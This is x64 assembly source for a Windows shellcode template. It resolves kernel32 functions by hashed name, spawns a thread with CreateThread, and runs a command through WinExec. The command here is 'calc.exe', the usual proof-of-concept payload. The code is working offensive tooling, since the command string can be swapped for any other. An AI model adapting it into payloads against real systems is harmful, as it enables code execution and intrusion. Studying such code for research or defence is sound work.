[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                      ; store rbx
  push rdi                      ; store rdi

  ; ensure stack is 16 bytes aligned
  mov rdi, rsp                  ; store current to rdi
  and rdi, 0xF                  ; calculate the offset
  sub rsp, rdi                  ; adjust current stack

  ; calculate entry address
  call calc_entry_addr          ; calculate the entry address
  flag_CEA:                     ; flag for calculate entry address

  ; clear the direction flag
  cld

  ; call "kernel32.dll, CreateThread"
  sub rsp, 32+4*8               ; reserve stack for arguments
  mov rcx, 0x9D08BD6B4CE14AE2   ; set function hash
  mov rdx, 0x702824E783A5AC49   ; set hash key
  xor r8, r8                    ; lpThreadAttributes
  xor r9, r9                    ; dwStackSize
  lea r10, [rbx+API_WinExec]    ; calculate function address
  mov [rsp+32+0*8], r10         ; lpStartAddress
  mov qword [rsp+32+1*8], rbx   ; lpParameter, set entry address
  mov qword [rsp+32+2*8], 0     ; dwCreationFlags CREATE_SUSPENDED
  mov qword [rsp+32+3*8], 0     ; lpThreadId
  call api_call                 ; call api function
  add rsp, 32+4*8               ; restore stack for arguments

  ; call "kernel32.dll, WaitForSingleObject"
  mov rcx, 0x79A2580C6E2937E5   ; set function hash
  mov rdx, 0xA280D0DCE28F4296   ; set hash key
  mov r8, rax                   ; set thread handle
  sub rsp, 32                   ; reserve stack
  call api_call                 ; call api function
  add rsp, 32                   ; restore stack

  ; restore aligned stack
  add rsp, rdi                  ; restore stack from rdi

  ; restore context
  pop rdi                       ; restore rdi
  pop rbx                       ; restore rbx
  ret                           ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                       ; get return address
  lea rbx, [rax-flag_CEA]       ; calculate entry address.
  push rax                      ; push return address
  ret                           ; return to entry

hash_api:
  %include "../../../src/x64/api_call.asm"

; call "kernel32.dll, WinExec"
API_WinExec:
  push rbx                      ; store rbx
  mov rbx, rcx                  ; read entry address from rcx

  mov rcx, 0xCA2DBA870B222A04   ; set function hash
  mov rdx, 0xB725F01C80CE0985   ; set hash key
  xor r9, r9                    ; clear r9
  lea r8, [rbx+command]         ; lpCmdLine
  mov r9b, [rbx+cmd_show]       ; uCmdShow
  sub rsp, 32                   ; reserve stack
  call api_call                 ; call api function
  add rsp, 32                   ; restore stack

  pop rbx                       ; restore rbx
  ret                           ; return to caller

command:
  db "calc.exe", 0

cmd_show:
  db 1
